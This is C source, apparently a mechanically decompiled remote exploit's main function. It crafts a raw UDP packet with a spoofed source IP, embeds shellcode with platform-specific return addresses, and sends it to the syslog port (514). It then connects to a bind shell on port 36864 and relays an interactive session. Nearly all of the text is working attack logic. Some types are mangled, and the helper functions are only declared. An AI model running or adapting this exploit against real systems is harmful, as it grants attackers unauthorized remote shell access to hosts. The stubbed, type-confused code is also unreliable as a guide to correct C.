
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_long ;
struct udphdr {int len; void* dest; void* source; } ;
struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; void* sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int ttl; int daddr; int saddr; int protocol; void* tot_len; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int spoof_ip ;
typedef int host ;
struct TYPE_2__ {int l_sz; int shell; } ;


 int AF_INET ;
 size_t D_M ;
 int D_PORT ;
 char* FK_IP ;
 int IPPROTO_IP ;
 int IPPROTO_RAW ;
 int IPPROTO_UDP ;
 int IP_HDRINCL ;
 char* LC_TEST ;
 int SOCK_RAW ;
 int atoi (char*) ;
 int banrl () ;
 int exit (int) ;
 int fprintf (int ,char*,...) ;
 struct hostent* gethostbyname (char*) ;
 int getopt (int,char**,char*) ;
 int herror (char*) ;
 void* htons (int) ;
 int inet_addr (char*) ;
 int inet_ntoa (struct in_addr) ;
 scalar_t__ make_sh (int ,int) ;
 scalar_t__ malloc (int) ;
 int memset (char*,size_t,int) ;
 int perror (char*) ;
 TYPE_1__* plat ;
 int re_connt (int) ;
 int send_recv_sh (int) ;
 int sendto (int,char*,int,size_t,struct sockaddr*,int) ;
 scalar_t__ setsock (char*,int) ;
 int setsockopt (int,int ,int ,char*,int) ;
 int sleep (int) ;
 int socket (int ,int ,int ) ;
 int stderr ;
 int stdout ;
 int strlen (char*) ;
 int strncpy (char*,char*,int) ;
 int strtoul (char*,int *,int *) ;
 int usage (char*) ;

int main(int argc,char **argv)
{
 int sock,whgl,type=D_M;
 struct hostent *he;
 struct sockaddr_in hehe;
 struct iphdr *__ip_hdr_st;
 struct udphdr *__udp_hdr_st;





 char spoof_ip[0x82]="216.239.33.101";

 int port=(36864);






 char host[0x82]="localhost";



 u_long shell=plat[type].shell;
 int l_sz=plat[type].l_sz;
 int atk_pk_size,make_sh_size;
 char *__tot_atk_pk,*atk_mbuf;

 (void)banrl();
 if(argc<2)
 {
  (void)usage(argv[D_M]);
 }

 while((whgl=getopt(argc,argv,"L:l:H:h:F:f:T:t:IiS:s:"))!=-1)
 {
  extern char *optarg;
  switch(whgl)
  {
   case 'H':
   case 'h':
    memset((char *)host,D_M,sizeof(host));
    strncpy(host,optarg,sizeof(host)-1);
    break;

   case 'F':
   case 'f':
    memset((char *)spoof_ip,D_M,sizeof(spoof_ip));
    strncpy(spoof_ip,optarg,sizeof(spoof_ip)-1);
    break;

   case 'L':
   case 'l':
    l_sz=atoi(optarg);
    break;

   case 'T':
   case 't':
    type=atoi(optarg);
    if(type>4)
     (void)usage(argv[D_M]);
    else
    {
     shell=plat[type].shell;
     l_sz=plat[type].l_sz;
    }
    break;

   case 'S':
   case 's':
    shell=strtoul(optarg,((void*)0),((void*)0));
    break;

   case 'I':
   case 'i':
    (void)usage(argv[D_M]);
    break;

   case '?':
    fprintf(stderr," Try `%s -i' for more information.\n\n",argv[D_M]);
    exit(-1);
    break;
  }
 }
 {
      fprintf(stdout," [0] Set packet code size.\n");
  make_sh_size=strlen((char *)make_sh(shell,l_sz));
  atk_pk_size=(sizeof(struct iphdr)+
    sizeof(struct udphdr)+make_sh_size);
  __tot_atk_pk=(char *)malloc(atk_pk_size);
  memset((char *)__tot_atk_pk,D_M,atk_pk_size);
  atk_mbuf=(sizeof(struct iphdr)+
    sizeof(struct udphdr)+
    (char *)__tot_atk_pk);
  fprintf(stdout," [1] Set protocol header.\n");
  __ip_hdr_st=(struct iphdr *)__tot_atk_pk;
  __udp_hdr_st=(struct udphdr *)(sizeof(struct iphdr)+__tot_atk_pk);
  fprintf(stdout," [2] Make shellcode.\n");
  strncpy(atk_mbuf,(char *)make_sh(shell,l_sz),make_sh_size);
 }

 if((he=gethostbyname(host))==((void*)0))
 {
  herror(" gethostbyname()");
  exit(-1);
 }
 if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))==-1)
 {
  perror(" socket()");
  exit(-1);
 }
 if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,"1",sizeof("1"))==-1)
 {
  perror(" setsockopt()");
  exit(-1);
 }

 fprintf(stdout," [3] Set rawsock.\n");

 __ip_hdr_st->version=4;
 __ip_hdr_st->ihl=sizeof(struct iphdr)/4;
 __ip_hdr_st->tot_len=htons(atk_pk_size);
 __ip_hdr_st->ttl=0xff;
 __ip_hdr_st->protocol=IPPROTO_UDP;
 __ip_hdr_st->saddr=inet_addr(spoof_ip);
 __ip_hdr_st->daddr=inet_ntoa(*((struct in_addr *)he->h_addr));

 __udp_hdr_st->source=htons(0x82);
 __udp_hdr_st->dest=htons(0x202);
 __udp_hdr_st->len=(atk_pk_size);

 hehe.sin_family=AF_INET;
 hehe.sin_port=__udp_hdr_st->dest;
 hehe.sin_addr=*((struct in_addr *)he->h_addr);
 memset(&(hehe.sin_zero),D_M,(8));

 fprintf(stdout," [4] Send packet.\n");

 if((sendto(sock,__tot_atk_pk,atk_pk_size,D_M,(struct sockaddr *)&hehe,sizeof(struct sockaddr)))==-1)
 {
  perror(" sendto()");
  exit(-1);
 }

 fprintf(stdout," [5] Trying %s:%d.\n",host,port);
 sleep(2);
 sock=(int)setsock(host,port);
 (void)re_connt(sock);

 fprintf(stdout," [*] Connected to %s:%d.\n",host,port);
 (void)send_recv_sh(sock);
}
